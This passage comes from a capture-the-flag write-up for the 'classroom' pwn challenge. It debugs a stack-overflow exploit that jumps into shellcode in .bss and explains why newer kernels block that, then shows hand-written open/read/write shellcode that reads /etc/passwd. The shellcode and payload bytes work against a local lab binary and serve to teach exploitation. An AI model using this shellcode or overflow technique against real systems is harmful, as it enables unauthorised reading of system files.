────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────
 RAX  0
 RBX  0x7ffe3275dbf8 —▸ 0x7ffe3275e4f5 ◂— '/home/kidd/Desktop/WORK/bsides24/pwn/classroom'
 RCX  0x7f4054f394e0 (write+16) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0x602040 (ans) ◂— 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaa\n'
 RDI  1
 RSI  0x400c68 ◂— push rdi
 R8   4
 R9   7
 R10  7
 R11  0x202
 R12  0
 R13  0x7ffe3275dc08 —▸ 0x7ffe3275e524 ◂— 'PWD=/home/kidd/Desktop/WORK/bsides24/pwn'
 R14  0x7f405508c000 (_rtld_global) —▸ 0x7f405508d2c0 ◂— 0
 R15  0
 RBP  0x7ffe3275dac8 ◂— 0x9090909090909090
 RSP  0x7ffe3275dab0 —▸ 0x40094d (kids_are_not_allowed_here+65) ◂— nop 
 RIP  0x602040 (ans) ◂— 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaa\n'
─────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────
Invalid instructions at 0x602040










───────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffe3275dab0 —▸ 0x40094d (kids_are_not_allowed_here+65) ◂— nop 
01:0008│-010 0x7ffe3275dab8 ◂— 0x9090909090909090
02:0010│-008 0x7ffe3275dac0 —▸ 0x400c68 ◂— push rdi
03:0018│ rbp 0x7ffe3275dac8 ◂— 0x9090909090909090
... ↓        4 skipped
─────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────
 ► 0         0x602040 ans
   1         0x40094d kids_are_not_allowed_here+65
   2 0x9090909090909090
   3 0x9090909090909090
   4 0x9090909090909090
   5 0x9090909090909090
   6 0x9090909090909090
   7 0x9090909090909090
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Inspect what is stored at `$rdx`

```c
pwndbg> x/32x $rdx
0x602040 <ans>: 0x61616161      0x61616162      0x61616163      0x61616164
0x602050 <ans+16>:      0x61616165      0x61616166      0x61616167      0x61616168
0x602060 <ans+32>:      0x61616169      0x6161616a      0x6161616b      0x6161616c
0x602070 <ans+48>:      0x6161616d      0x6161616e      0x6161616f      0x61616170
0x602080 <ans+64>:      0x61616171      0x61616172      0x61616173      0x61616174
0x602090 <ans+80>:      0x61616175      0x61616176      0x61616177      0x0000000a
0x6020a0:       0x00000000      0x00000000      0x00000000      0x00000000
0x6020b0:       0x00000000      0x00000000      0x00000000      0x00000000
pwndbg> disassemble $rip
Dump of assembler code for function ans:
=> 0x0000000000602040 <+0>:     (bad)
   0x0000000000602041 <+1>:     (bad)
   0x0000000000602042 <+2>:     (bad)
   0x0000000000602043 <+3>:     (bad)
   0x0000000000602044 <+4>:     (bad)
...[snip]...
pwndbg> kill
[Inferior 1 (process 33577) killed]
pwndbg> 
```

Excellent, we can reach our shellcode! Let's try running something more exciting than a cyclic pattern! 

The context of the pwn binary is to read the flag from file from the filesystem (`flag.txt`). We will try to read `/etc/passwd`.

The [Shellcraft](https://docs.pwntools.com/en/stable/shellcraft.html) module from Pwntools contains functions for generating shellcode. For example, there is a [readfile](https://docs.pwntools.com/en/stable/shellcraft/amd64.html#pwnlib.shellcraft.amd64.linux.readfile) module we can use. We'll add it to our `sploit.py`:

```python
# shellcode = '' # shellcode placeholder
shellcode = asm(pwnlib.shellcraft.amd64.readfile("/etc/passwd", 2))
```

And run `sploit.py` again,

```c
~/D/W/b/pwn $ python3 sploit.py LOCAL
[*] '/home/kidd/Desktop/WORK/bsides24/pwn/classroom'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    Stack:    Executable
    RWX:      Has RWX segments
[DEBUG] cpp -C -nostdinc -undef -P -I/home/kidd/.local/lib/python3.11/site-packages/pwnlib/data/includes /dev/stdin
[DEBUG] Assembling
    .section .shellcode,"awx"
    .global _start
    .global __start
    _start:
    __start:
    .intel_syntax noprefix
    .p2align 0
        /* Save destination */
        push 2
        pop r8
        /* push b'/etc/passwd\x00' */
        push 0x1010101 ^ 0x647773
        xor dword ptr [rsp], 0x1010101
        mov rax, 0x7361702f6374652f
        push rax
        /* call open('rsp', 'O_RDONLY') */
        push 2 /* 2 */
        pop rax
        mov rdi, rsp
        xor esi, esi /* O_RDONLY */
        syscall
        /* Save file descriptor for later */
        mov rbx, rax
        /* call fstat('rax', 'rsp') */
        mov rdi, rax
        push 5 /* 5 */
        pop rax
        mov rsi, rsp
        syscall
        /* Get file size */
        add rsp, 48
        mov rdx, [rsp]
        /* call sendfile('r8', 'rbx', 0, 'rdx') */
        mov r10, rdx
        push 40 /* 0x28 */
        pop rax
        mov rdi, r8
        mov rsi, rbx
        cdq /* rdx=0 */
        syscall
[DEBUG] /usr/bin/x86_64-linux-gnu-as -64 -o /tmp/pwn-asm-fzf2dxop/step2 /tmp/pwn-asm-fzf2dxop/step1
[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-asm-fzf2dxop/step3 /tmp/pwn-asm-fzf2dxop/step4
00000000  6a 02 41 58  68 72 76 65  01 81 34 24  01 01 01 01  │j·AX│hrve│··4$│····│
00000010  48 b8 2f 65  74 63 2f 70  61 73 50 6a  02 58 48 89  │H·/e│tc/p│asPj│·XH·│
00000020  e7 31 f6 0f  05 48 89 c3  48 89 c7 6a  05 58 48 89  │·1··│·H··│H··j│·XH·│
00000030  e6 0f 05 48  83 c4 30 48  8b 14 24 49  89 d2 6a 28  │···H│··0H│··$I│··j(│
00000040  58 4c 89 c7  48 89 de 99  0f 05 61 61  74 61 61 61  │XL··│H···│··aa│taaa│
00000050  75 61 61 61  76 61 61 61  77 61 61 61               │uaaa│vaaa│waaa│
...[snip]...
[DEBUG] Sent 0x190 bytes:
    00000000  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
    *
    00000080  90 90 90 90  90 90 90 90  0c 09 40 00  00 00 00 00  │····│····│··@·│····│
    00000090  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
    *
    00000190
[*] Switching to interactive mode
[DEBUG] Received 0x3a bytes:
    00000000  57 68 61 74  20 61 72 65  20 79 6f 75  20 64 6f 69  │What│ are│ you│ doi│
    00000010  6e 67 20 68  65 72 65 3f  21 20 4b 69  64 73 20 61  │ng h│ere?│! Ki│ds a│
    00000020  72 65 20 6e  6f 74 20 61  6c 6c 6f 77  65 64 20 68  │re n│ot a│llow│ed h│
    00000030  65 72 65 21  20 f0 9f 94  9e 0a                     │ere!│ ···│··│
    0000003a
What are you doing here?! Kids are not allowed here! 🔞
[*] Got EOF while reading in interactive
$ 
[DEBUG] Sent 0x1 bytes:
    b'\n'
[*] Process '/home/kidd/Desktop/WORK/bsides24/pwn/classroom' stopped with exit code -11 (SIGSEGV) (pid 36508)
[*] Got EOF while sending in interactive
~/D/W/b/pwn $ 
```

But we are still crashing. Let's attach gdb and break at the address of our shellpoint.

```c
~/D/W/b/pwn $ gdb -q ./classroom
...[snip]...
pwndbg> disassemble kids_are_not_allowed_here 
Dump of assembler code for function kids_are_not_allowed_here:
   0x000000000040090c <+0>:     push   rbp
   0x000000000040090d <+1>:     mov    rbp,rsp
   0x0000000000400910 <+4>:     sub    rsp,0x10
   0x0000000000400914 <+8>:     lea    rax,[rip+0x34d]        # 0x400c68
   0x000000000040091b <+15>:    mov    QWORD PTR [rbp-0x8],rax
   0x000000000040091f <+19>:    mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000400923 <+23>:    mov    rdi,rax
   0x0000000000400926 <+26>:    call   0x400720 <strlen@plt>
   0x000000000040092b <+31>:    mov    rdx,rax
   0x000000000040092e <+34>:    mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000400932 <+38>:    mov    rsi,rax
   0x0000000000400935 <+41>:    mov    edi,0x1
   0x000000000040093a <+46>:    call   0x400700 <write@plt>
   0x000000000040093f <+51>:    lea    rdx,[rip+0x2016fa]        # 0x602040 <ans>
   0x0000000000400946 <+58>:    mov    eax,0x0
   0x000000000040094b <+63>:    call   rdx
   0x000000000040094d <+65>:    nop
   0x000000000040094e <+66>:    leave
   0x000000000040094f <+67>:    ret
End of assembler dump.
```

break at `0x000000000040094b <+63>:    call   rdx` and run `sploit.py`. 
GDB will break at `call rdx`. 

```c
pwndbg> b *0x000000000040094b
Breakpoint 1 at 0x40094b
pwndbg> c
Continuing.

Breakpoint 1, 0x000000000040094b in kids_are_not_allowed_here ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────
*RAX  0
 RBX  0x7ffede8dd408 —▸ 0x7ffede8de4f5 ◂— '/home/kidd/Desktop/WORK/bsides24/pwn/classroom'
*RCX  0x7f561a9d14e0 (write+16) ◂— cmp rax, -0x1000 /* 'H=' */
*RDX  0x602040 (ans) ◂— 0x657672685841026a
*RDI  1
*RSI  0x400c68 ◂— push rdi
*R8   4
 R9   7
 R10  7
*R11  0x202
 R12  0
 R13  0x7ffede8dd418 —▸ 0x7ffede8de524 ◂— 'PWD=/home/kidd/Desktop/WORK/bsides24/pwn'
 R14  0x7f561ab24000 (_rtld_global) —▸ 0x7f561ab252c0 ◂— 0
 R15  0
*RBP  0x7ffede8dd2d8 ◂— 0x9090909090909090
*RSP  0x7ffede8dd2c8 ◂— 0x9090909090909090
*RIP  0x40094b (kids_are_not_allowed_here+63) ◂— call rdx
──────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────
 ► 0x40094b <kids_are_not_allowed_here+63>    call   rdx                         <ans>
        rdi: 1
        rsi: 0x400c68 ◂— push rdi
        rdx: 0x602040 (ans) ◂— 0x657672685841026a
        rcx: 0x7f561a9d14e0 (write+16) ◂— cmp rax, -0x1000 /* 'H=' */
 
   0x40094d <kids_are_not_allowed_here+65>    nop    
   0x40094e <kids_are_not_allowed_here+66>    leave  
   0x40094f <kids_are_not_allowed_here+67>    ret    
 
   0x400950 <kinder>                          push   rbp
   0x400951 <kinder+1>                        mov    rbp, rsp
   0x400954 <kinder+4>                        add    rsp, -0x80
   0x400958 <kinder+8>                        mov    dword ptr [rbp - 4], 0
   0x40095f <kinder+15>                       lea    rax, [rip + 0x33d]              RAX => 0x400ca3 ◂— 'Have a nice day!\n'
   0x400966 <kinder+22>                       mov    qword ptr [rbp - 0x10], rax
   0x40096a <kinder+26>                       lea    rax, [rip + 0x347]              RAX => 0x400cb8 ◂— push rsi /* 'Very interesting question! Let me think about it.....' */
────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffede8dd2c8 ◂— 0x9090909090909090
01:0008│-008 0x7ffede8dd2d0 —▸ 0x400c68 ◂— push rdi
02:0010│ rbp 0x7ffede8dd2d8 ◂— 0x9090909090909090
... ↓        5 skipped
──────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────
 ► 0         0x40094b kids_are_not_allowed_here+63
   1 0x9090909090909090
   2 0x9090909090909090
   3 0x9090909090909090
   4 0x9090909090909090
   5 0x9090909090909090
   6 0x9090909090909090
   7 0x9090909090909090
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Continue execution.

```c
pwndbg> c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x0000000000602040 in ans ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────
 RAX  0
 RBX  0x7ffede8dd408 —▸ 0x7ffede8de4f5 ◂— '/home/kidd/Desktop/WORK/bsides24/pwn/classroom'
 RCX  0x7f561a9d14e0 (write+16) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0x602040 (ans) ◂— 0x657672685841026a
 RDI  1
 RSI  0x400c68 ◂— push rdi
 R8   4
 R9   7
 R10  7
 R11  0x202
 R12  0
 R13  0x7ffede8dd418 —▸ 0x7ffede8de524 ◂— 'PWD=/home/kidd/Desktop/WORK/bsides24/pwn'
 R14  0x7f561ab24000 (_rtld_global) —▸ 0x7f561ab252c0 ◂— 0
 R15  0
 RBP  0x7ffede8dd2d8 ◂— 0x9090909090909090
*RSP  0x7ffede8dd2c0 —▸ 0x40094d (kids_are_not_allowed_here+65) ◂— nop 
*RIP  0x602040 (ans) ◂— 0x657672685841026a
──────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────
 ► 0x602040 <ans>       push   2
   0x602042 <ans+2>     pop    r8                             R8 => 2
   0x602044 <ans+4>     push   0x1657672
   0x602049 <ans+9>     xor    dword ptr [rsp], 0x1010101     [0x7ffede8dd2b8] => 6584179
   0x602050 <ans+16>    movabs rax, 0x7361702f6374652f        RAX => 0x7361702f6374652f ('/etc/pas')
   0x60205a <ans+26>    push   rax
   0x60205b <ans+27>    push   2
   0x60205d <ans+29>    pop    rax                            RAX => 2
   0x60205e <ans+30>    mov    rdi, rsp                       RDI => 0x7ffede8dd2b0 ◂— '/etc/passwd'
   0x602061 <ans+33>    xor    esi, esi                       ESI => 0
   0x602063 <ans+35>    syscall 
────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffede8dd2c0 —▸ 0x40094d (kids_are_not_allowed_here+65) ◂— nop 
01:0008│-010 0x7ffede8dd2c8 ◂— 0x9090909090909090
02:0010│-008 0x7ffede8dd2d0 —▸ 0x400c68 ◂— push rdi
03:0018│ rbp 0x7ffede8dd2d8 ◂— 0x9090909090909090
... ↓        4 skipped
──────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────
 ► 0         0x602040 ans
   1         0x40094d kids_are_not_allowed_here+65
   2 0x9090909090909090
   3 0x9090909090909090
   4 0x9090909090909090
   5 0x9090909090909090
   6 0x9090909090909090
   7 0x9090909090909090
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Disassemble instruction at $rip

```c
pwndbg> x/32x $rip
0x602040 <ans>: 0x5841026a      0x65767268      0x24348101      0x01010101
0x602050 <ans+16>:      0x652fb848      0x702f6374      0x6a507361      0x89485802
0x602060 <ans+32>:      0x0ff631e7      0xc3894805      0x6ac78948      0x89485805
0x602070 <ans+48>:      0x48050fe6      0x4830c483      0x4924148b      0x286ad289
0x602080 <ans+64>:      0xc7894c58      0x99de8948      0x6161050f      0x61616174
0x602090 <ans+80>:      0x61616175      0x61616176      0x61616177      0x0000000a
0x6020a0:       0x00000000      0x00000000      0x00000000      0x00000000
0x6020b0:       0x00000000      0x00000000      0x00000000      0x00000000
pwndbg> disassemble $rip
Dump of assembler code for function ans:
=> 0x0000000000602040 <+0>:     push   0x2
   0x0000000000602042 <+2>:     pop    r8
   0x0000000000602044 <+4>:     push   0x1657672
   0x0000000000602049 <+9>:     xor    DWORD PTR [rsp],0x1010101
   0x0000000000602050 <+16>:    movabs rax,0x7361702f6374652f
   0x000000000060205a <+26>:    push   rax
   0x000000000060205b <+27>:    push   0x2
   0x000000000060205d <+29>:    pop    rax
   0x000000000060205e <+30>:    mov    rdi,rsp
   0x0000000000602061 <+33>:    xor    esi,esi
   0x0000000000602063 <+35>:    syscall
   0x0000000000602065 <+37>:    mov    rbx,rax
   0x0000000000602068 <+40>:    mov    rdi,rax
   0x000000000060206b <+43>:    push   0x5
   0x000000000060206d <+45>:    pop    rax
   0x000000000060206e <+46>:    mov    rsi,rsp
   0x0000000000602071 <+49>:    syscall
   0x0000000000602073 <+51>:    add    rsp,0x30
   0x0000000000602077 <+55>:    mov    rdx,QWORD PTR [rsp]
   0x000000000060207b <+59>:    mov    r10,rdx
   0x000000000060207e <+62>:    push   0x28
   0x0000000000602080 <+64>:    pop    rax
   0x0000000000602081 <+65>:    mov    rdi,r8
   0x0000000000602084 <+68>:    mov    rsi,rbx
   0x0000000000602087 <+71>:    cdq
   0x0000000000602088 <+72>:    syscall
   0x000000000060208a <+74>:    (bad)
   0x000000000060208b <+75>:    (bad)
   0x000000000060208c <+76>:    je     0x6020ef
   0x000000000060208e <+78>:    (bad)
   0x000000000060208f <+79>:    (bad)
   0x0000000000602090 <+80>:    jne    0x6020f3
   0x0000000000602092 <+82>:    (bad)
   0x0000000000602093 <+83>:    (bad)
   0x0000000000602094 <+84>:    jbe    0x6020f7
   0x0000000000602096 <+86>:    (bad)
   0x0000000000602097 <+87>:    (bad)
   0x0000000000602098 <+88>:    ja     0x6020fb
   0x000000000060209a <+90>:    (bad)
   0x000000000060209b <+91>:    (bad)
   0x000000000060209c <+92>:    or     al,BYTE PTR [rax]
   0x000000000060209e <+94>:    add    BYTE PTR [rax],al
End of assembler dump.
pwndbg> quit
Detaching from program: /home/kidd/Desktop/WORK/bsides24/pwn/classroom, process 36508
[Inferior 1 (process 36508) detached]
~/D/W/b/pwn $ 
```

And, we get a segmentation fault although our shellcode is completely intact. 

## Relatively modern linux kernels

We can run the same exploit via strace to see what exactly is happening. 
Modify the following in `sploit.py` function `start_local()` to strace the binary.

```python
# return process([exe.path] + argv, *a, **kw)
return process('strace ./classroom', shell=True)
```

You can also comment out `context.log_level = 'debug'` to get a less cluttered output.

```c
~/D/W/b/pwn $ python3 sploit.py LOCAL
[*] '/home/kidd/Desktop/WORK/bsides24/pwn/classroom'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    Stack:    Executable
    RWX:      Has RWX segments
00000000  6a 02 41 58  68 72 76 65  01 81 34 24  01 01 01 01  │j·AX│hrve│··4$│····│
00000010  48 b8 2f 65  74 63 2f 70  61 73 50 6a  02 58 48 89  │H·/e│tc/p│asPj│·XH·│
00000020  e7 31 f6 0f  05 48 89 c3  48 89 c7 6a  05 58 48 89  │·1··│·H··│H··j│·XH·│
00000030  e6 0f 05 48  83 c4 30 48  8b 14 24 49  89 d2 6a 28  │···H│··0H│··$I│··j(│
00000040  58 4c 89 c7  48 89 de 99  0f 05 61 61  74 61 61 61  │XL··│H···│··aa│taaa│
00000050  75 61 61 61  76 61 61 61  77 61 61 61               │uaaa│vaaa│waaa│
0000005c
00000000  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
*
00000080  90 90 90 90  90 90 90 90  0c 09 40 00  00 00 00 00  │····│····│··@·│····│
00000090  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
*
00000190
[+] Starting local process '/bin/sh': pid 36911
[*] Paused (press any to continue)
[*] Switching to interactive mode
) = 50
read(0, "y\n", 4)                       = 2
write(1, "Feel free to ask!\n>> ", 21Feel free to ask!
>> )  = 21
read(0, "y\n", 31)                      = 2
write(1, "Very interesting question! Let m"..., 51Very interesting question! Let me think about it..
) = 51
write(1, "\nAlright! Do you have any more q"..., 50
Alright! Do you have any more questions? (y/n)
> ) = 50
read(0, "y\n", 4)                       = 2
write(1, "Enough questions for today class"..., 81Enough questions for today class...
Well, maybe a last one and then we finish!
> ) = 81
read(0, "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"..., 332) = 332write(1, "What are you doing here?! Kids a"..., 58What are you doing here?! Kids are not allowed here! 🔞
) = 58
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_ACCERR, si_addr=0x602040} ---
+++ killed by SIGSEGV (core dumped) +++
[*] Process '/bin/sh' stopped with exit code 139 (pid 36911)
Segmentation fault
[*] Got EOF while reading in interactive
$ 
[*] Got EOF while sending in interactive
~/D/W/b/pwn $ 
```

The **si_code** [`sigaction`](https://man7.org/linux/man-pages/man2/sigaction.2.html) man page states that the `SEGV_ACCERR` error that happens when accessing `0x602040` (the address of the `ans` buffer where our shellcode resides) means `Invalid permissions for mapped object.` In other words, most probably the memory page is not mapped as executable. 
> sidenote: we cannot ROP our way to change memory permissions due to a) seccomp ~~and b) limited shellcode space~~ (correction: we could actually egghunt it if not for seccomp)

We can verify in gdb that the memory segment from which we are trying to execute our shellcode `(0x602000 - 0x603000)` is mapped as `read`, `write`, `private`, but not `execute`:

```python
pwndbg> info proc mappings
process 37032
Mapped address spaces:

          Start Addr           End Addr       Size     Offset  Perms  objfile
            0x400000           0x402000     0x2000        0x0  r-xp   /home/kidd/Desktop/WORK/bsides24/pwn/classroom
            0x601000           0x602000     0x1000     0x1000  r--p   /home/kidd/Desktop/WORK/bsides24/pwn/classroom
            0x602000           0x603000     0x1000     0x2000  rw-p   /home/kidd/Desktop/WORK/bsides24/pwn/classroom   <---
           0x15a5000          0x15c6000    0x21000        0x0  rw-p   [heap]
...[snip]...
pwndbg> 
```

We can also see that the specific memory segment is part of the [`.bss`](https://blog.mbedded.ninja/programming/languages/c/bss-section/) section

```python
pwndbg> info file
Symbols from "/home/kidd/Desktop/WORK/bsides24/pwn/classroom".
Native process:
        Using the running image of attached Thread 0x7f440d346740 (LWP 37032).
        While running this, GDB does not access memory from...
Local exec file:
        `/home/kidd/Desktop/WORK/bsides24/pwn/classroom', file type elf64-x86-64.
        Entry point: 0x400760
...[snip]...
        0x0000000000601d98 - 0x0000000000601f98 is .dynamic
        0x0000000000601f98 - 0x0000000000602000 is .got
        0x0000000000602000 - 0x0000000000602010 is .data
        0x0000000000602020 - 0x00000000006020a0 is .bss   <---
...[snip]...
pwndbg> 
```

So how come .bss section is not executable? This can be debated, but my guess is that this challenge has been created for older kernels.

At some point in spring 2020 there was a [patch](https://lore.kernel.org/all/20200327064820.12602-1-keescook@chromium.org/) submitted in the linux kernel that disabled `READ_IMPLIES_EXEC`, and by proxy the execute permission of - among others - the `.bss` section. This [apparently](https://stackoverflow.com/questions/64833715/linux-default-behavior-of-executable-data-section-changed-between-5-4-and-5-9/64837581#64837581) took effect at kernel 5.8. 

Right. How can we proceed? Spin up an ubuntu 18.04 and try the same thing there. 

> note: it might be possible to enable `READ_IMPLIES_EXEC` using [`setarch`](https://man7.org/linux/man-pages/man8/setarch.8.html), but i had no luck in with kali rolling @6.8.11. For example using: `setarch x86_64 -v --read-implies-exec ./classroom`

```bash
user@u1804:~$ uname -a
Linux u1804 4.15.0-213-generic #224-Ubuntu SMP Mon Jun 19 13:30:12 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
user@u1804:~$ cat serve.sh
#!/bin/sh
socat \
-v -T120 \
TCP-LISTEN:8000,reuseaddr,fork \
EXEC:"timeout 120 strace ./classroom"
user@u1804:~$ ./serve.sh 
```

Then run `sploit.py` again specifing the remote endpoint

```python
~/D/W/b/pwn $ python3 sploit.py 
[*] '/home/kidd/Desktop/WORK/bsides24/pwn/classroom'
...[snip]...
[+] Opening connection to 192.168.13.37 on port 8000: Done
[*] Paused (press any to continue)
...[snip]...
```

Inspecting output on `serve.sh` 

```bash
execve("./classroom", ["./classroom"], 0x7fffe16e2020 /* 30 vars */) = 0
...[snip]...

Alright! Do you have any more questions? (y/n)
> > 2024/08/06 19:05:54.122579  length=2 from=109 to=110
y
"y\n", 4)                       = 2
write(1, "Enough questions for today class"..., 81) = 81
read(0, < 2024/08/06 19:05:54.123127  length=81 from=664 to=744
Enough questions for today class...
Well, maybe a last one and then we finish!
> > 2024/08/06 19:05:54.131643  length=400 from=111 to=510
........................................................................................................................................\f      @....................................................................................................................................................................................................................................................................."\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"..., 332) = 332
write(1, "What are you doing here?! Kids a"..., 58) = 58
open("/etc/passwd", O_RDONLY)           = 5
fstat(5, < 2024/08/06 19:05:54.140513  length=58 from=745 to=802
What are you doing here?! Kids are not allowed here! ....
 <unfinished ...>)             = ?
+++ killed by SIGSYS (core dumped) +++
timeout: the monitored command dumped core
2024/08/06 19:05:54 socat[8944] E waitpid(): child 8946 exited on signal 31
user@u1804:~$ 
```

Well, it still crashes.. but for another reason. The very last thing executed was the `fstat` system call `fstat(5, < 2024/08/06 19:05:54.140513  length=58 from=745 to=802`.
If you recall, that was not in the `seccomp` allowed system calls, and as such the program got killed. 

We also get a `signal 31` exit code, [confirming](https://faculty.cs.niu.edu/~hutchins/csci480/signals.htm) it's a bad system call.

On the upside the `open("/etc/passwd", O_RDONLY)` succeeded.

We can also confirm it with in gdb. Observe that the same segment is mapped as `rwxp` now, instead of `rw-p`. 

```c
pwndbg> info proc mappings                                                             
process 4512                                                                           
Mapped address spaces:                                                                                       
                                                                                       
          Start Addr           End Addr       Size     Offset  Perms  objfile          
            0x400000           0x402000     0x2000        0x0  r-xp   /home/user/classroom
            0x601000           0x602000     0x1000     0x1000  r-xp   /home/user/classroom
            0x602000           0x603000     0x1000     0x2000  rwxp   /home/user/classroom   <---
```

## hand crafting shellcode

We'll need to craft some shellcode that handles opening a file, reading it, and writing it's content to stdout. 

Lucking enough, the system calls that are allowed by `seccomp` are [read()](https://man7.org/linux/man-pages/man2/read.2.html), [open()](https://man7.org/linux/man-pages/man2/open.2.html), [write()](https://man7.org/linux/man-pages/man2/write.2.html), and [exit()](https://man7.org/linux/man-pages/man2/exit.2.html).

### open()
open() system call opens the file specified by pathname.  If the specified file does not exist, it may optionally (if O_CREAT is specified in flags) be created by open(). The return value of open() is a file descriptor, a small, nonnegative integer that is an index to an entry in the process's table of open file descriptors.

### read()
attempts to read up to `_count_` bytes from file descriptor `_fd_` into the buffer starting at `_buf_`

### write()
write() writes up to count bytes from the buffer starting at buf to the file referred to by the file descriptor fd.

### exit()
exit() terminates the calling process "immediately".

Having in mind the linux kernel system call [implementation](https://github.com/torvalds/linux/blob/0c3836482481200ead7b416ca80c68a29cfdaabd/arch/x86/entry/entry_64.S#L50) we need to form our system calls as follows:

```c
 * Registers on entry:
 * rax  system call number
 * rcx  return address
 * r11  saved rflags (note: r11 is callee-clobbered register in C ABI)
 * rdi  arg0
 * rsi  arg1
 * rdx  arg2
 * r10  arg3 (needs to be moved to rcx to conform to C ABI)
 * r8   arg4
 * r9   arg5
 * (note: r12-r15, rbp, rbx are callee-preserved in C ABI)
```

The simplest asm code implementing these calls looks similar to:

```c
; nasm -f elf64 open-read-write.asm -o open-read-write.o ; ld open-read-write.o -o open-read-write

section .data
    filename db '/etc/passwd', 0  ; Filename to open

section .text
    global _start

_start:
    ; Open the file (sys_open) 
    ; int open(const char *pathname, int flags, ... /* mode_t mode */ ); <-- $rdi = filename , $rsi = flags
    mov rax, 2                          ; syscall number for sys_open
    mov rdi, filename                   ; filename
    mov rsi, 0                          ; flags (O_RDONLY = 0)
    ;   mov rdx, 0                      ; mode (not needed for read())
    syscall
    mov rbx, rax                        ; store file descriptor in rbx

    ; Read the file (sys_read)
    ; ssize_t read(int fd, void buf[.count], size_t count);  <-- $rdi = file descriptor from $rbx, $rsi = where to read into, $rdx = # bytes
    mov rax, 0                          ; syscall number for sys_read
    mov rdi, rbx                        ; file descriptor
    mov rsi, rsp                        ; buffer to read into
    mov rdx, 300                        ; number of bytes to read - 300 in this case
    syscall

    ; Write the buffer to stdout (sys_write)
    ; ssize_t write(int fd, const void buf[.count], size_t count);  <-- $rdi = stdout, $rsi = buffer to write from, $rdx = #bytes
    mov rax, 1                          ; syscall number for sys_write
    mov rdi, 1                          ; file descriptor (stdout)
    ;   mov rsi, rsp                    ; buffer to write from (already there from read())
    ;   mov rdx, rbx                    ; number of bytes to write (already there from read())
    syscall

    ; Exit the program (sys_exit)
    ; [[noreturn]] void _exit(int status);  <-- $rdi = τα ειπαμε
    mov rax, 60                         ; syscall number for sys_exit
    xor rdi, rdi                        ; exit code 0
    syscall
```

If we compile and run it:

```bash 
~/D/W/b/pwn $ nasm -f elf64 open-read-write.asm -o open-read-write.o ; ld open-read-write.o -o open-read-write 
~/D/W/b/pwn $ ./open-read-write 
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/⏎                                                                                                                              
~/D/W/b/pwn $ 
```

Although it works, there are two problems with this shellcode:
- it produces **a lot** of null bytes.
- we cannot easily extract shellcode from it since it uses references to the .data segment. 

```c                                                                                                                  
~/D/W/b/pwn $ objdump -Mintel -D -z open-read-write

open-read-write:     file format elf64-x86-64


Disassembly of section .text:

0000000000401000 <_start>:
  401000:       b8 02 00 00 00          mov    eax,0x2
  401005:       48 bf 00 20 40 00 00    movabs rdi,0x402000
  40100c:       00 00 00 
  40100f:       be 00 00 00 00          mov    esi,0x0
  401014:       0f 05                   syscall
  401016:       48 89 c3                mov    rbx,rax
  401019:       b8 00 00 00 00          mov    eax,0x0
  40101e:       48 89 df                mov    rdi,rbx
  401021:       48 89 e6                mov    rsi,rsp
  401024:       ba 2c 01 00 00          mov    edx,0x12c
  401029:       0f 05                   syscall
  40102b:       b8 01 00 00 00          mov    eax,0x1
  401030:       bf 01 00 00 00          mov    edi,0x1
  401035:       0f 05                   syscall
  401037:       b8 3c 00 00 00          mov    eax,0x3c
